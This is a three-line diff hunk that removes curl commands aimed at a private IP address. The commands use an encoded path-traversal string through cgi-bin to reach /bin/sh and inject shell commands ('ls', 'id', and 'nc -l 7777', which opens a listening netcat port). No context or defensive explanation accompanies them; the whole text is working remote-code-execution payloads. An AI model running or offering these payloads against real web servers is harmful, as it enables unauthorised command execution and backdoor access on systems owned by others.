@@ -1,3 +1,0 @@
- curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls'
- curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'
-curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;nc -l 7777'
